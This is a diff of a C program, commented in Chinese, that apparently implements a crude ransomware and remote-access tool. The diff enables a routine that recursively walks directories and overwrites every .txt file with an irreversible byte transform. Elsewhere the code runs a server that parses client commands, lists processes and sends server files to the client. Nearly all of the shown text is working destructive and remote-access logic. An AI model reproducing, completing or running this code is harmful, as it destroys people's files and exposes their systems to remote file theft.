@@ -29,7 +29,7 @@
 #define COMMAND_SEPARATOR ','
 #define MAX_PATH_LENGTH 512
 #define ZERO(buff) memset(buff,0,MAX_PACKET)
-#define DEBUG 1
+#define DEBUG 0
 
 
 // 功能
@@ -135,56 +135,46 @@ int startServer(){
 
 int encryptionPath(char * path){
     if(DEBUG){
-        // printf("[#]Path is %s \n",path);
+        printf("[#]Path is %s \n",path);
     }
     struct dirent * ent = NULL;
     DIR * pDir;
     pDir = opendir(path);
     while(NULL != (ent = readdir(pDir))){
-        if(DEBUG){
-            // printf("[#]read dir ...%s \n",ent->d_name);
-        }
-        /*
-        struct stat st;
-        stat(path,&st);
-        if(stat(path,&st)){
-            if(S_ISDIR(st.st_mode)){
-
-            }
-        }
-        */
-            // 排除软链接
+        // 排除软链接
         if(ent->d_type & 4 && !(ent->d_type & 10)){
              if(ent->d_name[0] == '.' || strcmp(ent->d_name,"..") == 0){
+                 // 跳过特殊目录
                  continue;
              }
             // normal file ....
-            // 
-           
-
+            // 获取文件名长度
             size_t pathLen = strlen(path)+strlen(ent->d_name)+2;
+            // 分配内存空间
             char * absolutePath = (char *)calloc(pathLen,1);
+            // 拼接文件名
             strcat(absolutePath,path);
             strcat(absolutePath,ent->d_name);
             strcat(absolutePath,"/");
-            // strcat(absolutePath,path);
+            // 递归子目录
             encryptionPath(absolutePath);
+            // 释放内存
             free(absolutePath);
             // encryption file ....
         }else{
-                size_t pathLen = strlen(path)+strlen(ent->d_name)+2;
+                // 普通文件处理动作
+                size_t pathLen = strlen(path)+strlen(ent->d_name)+2; // 获取文件名长度
                 char * absolutePath = (char *)calloc(pathLen,1);
                 strcat(absolutePath,path);
                 strcat(absolutePath,ent->d_name);
                 // strcat(absolutePath,"/");
                 char * ext = strrchr(ent->d_name,'.');
                 // printf("[X]path : %s , ext %s \n",absolutePath,ext);
-                
-                if(ext != NULL && strcmp(ext,".txt") == 0){
+                if(ext != NULL && strcmp(ext,".txt") == 0){ // 判断扩展名是否是.txt
                     // txt文件
                     FILE * fp = NULL;
                     if(DEBUG){
-                        //printf("[X]encryption : %s \n",absolutePath);
+                        printf("[X]encryption : %s \n",absolutePath);
                     }
                     fp = fopen(absolutePath,"r");
                     if(fp != NULL ){
@@ -192,20 +182,17 @@ int encryptionPath(char * path){
                         stat(absolutePath,&encryptFileStat);
                         // 申请一块与文件大小相等的内存
                         char * fileSize = (char *)calloc(encryptFileStat.st_size+1,sizeof(char));
-
-                        printf("[*]filesize : %lld \n",encryptFileStat.st_size);
-                        for(int x = 0;x<strlen(absolutePath);x++){
-                            printf("0x%x ",absolutePath[x]);
+                        if(DEBUG){
+                            printf("[*]filesize : %lld \n",encryptFileStat.st_size);
+                            printf("[*]read: %s uid : %d \n",fileSize,getuid());
                         }
-                        printf("\n[X]encryption : %s \n",absolutePath);
+                        printf("[X]encryption : %s \n",absolutePath);
                         // 将文件内容放入内存
                         fread(fileSize,1,encryptFileStat.st_size,fp);
-                        printf("read: %s uid : %d \n",fileSize,getuid());
                         fclose(fp);
                         char * pchar = fileSize;
                         // 遍历
                         while(*pchar){
-                            printf("char * -> 0x%x \n",*pchar);
                             if((*pchar & 1) == 1){
                                 //奇数
                                 *pchar+=1;
@@ -213,16 +200,16 @@ int encryptionPath(char * path){
                                 // 偶数
                                 *pchar/=2;
                             }
-                            printf("char * -> %c \n",*pchar);
                             pchar++;
                         }
+                        // 将内存写入文件
+                        fp = fopen(absolutePath,"w");
+                        fwrite(fileSize,strlen(fileSize),1,fp);
+                        fclose(fp);
                         free(fileSize);
                     }
-                }else{
-                    // 无扩展名文件
                 }
-                
-                free(absolutePath);
+            free(absolutePath);
         }
     }
     return 0;
@@ -278,19 +265,12 @@ int viewProcess(int clientSock,char * args){
 }
 
 int readServerFile(int clientSock,char * args){
-
-
     if(DEBUG){
         printf("[~]readServerFile : %s \n",args);
-        // while(args){
-        //    // printf("0x%x ",*args++);
-        //     //args++;
-        // }
     }
     char fileData[MAX_PACKET];
     ZERO(fileData);
     
-
     FILE * fp = NULL;
     fp = fopen(args,"r");
     if(fp==NULL){
@@ -301,15 +281,6 @@ int readServerFile(int clientSock,char * args){
     struct stat statbuf;
     stat(args,&statbuf);
     size_t size=statbuf.st_size;
-
-    if(DEBUG){
-        printf("[~]file length  : %lu \n",size);
-        // while(args){
-        //    // printf("0x%x ",*args++);
-        //     //args++;
-        // }
-    }
-
     char * fileBuff = (char *)calloc(size,sizeof(char));
     // memset(fileBuff,0,sizeof(fileBuff));
     // 发送文件内容
@@ -398,9 +369,7 @@ int analysisCommand(int clientSock,char * clientMessage){
     return 0;
 }
 
-int main(int argc, char const *argv[])
-{
-    encryption();
-    
+int main(int argc, char const *argv[]){
+    encryption();    
     return 0;
 }
